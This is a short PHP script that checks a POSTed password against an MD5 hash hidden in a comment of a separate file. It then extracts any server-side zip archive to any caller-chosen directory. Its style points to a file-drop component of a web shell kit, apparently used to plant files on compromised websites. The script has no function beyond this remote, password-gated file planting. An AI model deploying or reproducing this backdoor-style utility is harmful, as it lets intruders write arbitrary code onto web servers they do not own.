<?php /* 16.09.16 
1 url, 2 str
s[1] - кудаа
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
if(!isset($_POST['s'])){exit('[X]');}
$d=explode('*/',file_get_contents('./p.php'));
$d=explode('/*',$d[0]);$s=explode('~',$_POST['s']); 
if(md5($s[0])!=$d[1]){exit('[X] PASS');}$d = array();

$d=explode('~', $_POST['file']);

if(file_exists($s[1])){
        $zip = new ZipArchive;
        $zip->open($s[1]);
        $zip->extractTo($s[2]);
        $zip->close();
        echo '[V] ZipOut good!'; 
	}else{
		echo '[X] ZipUrl Not exist!';
	}



?>
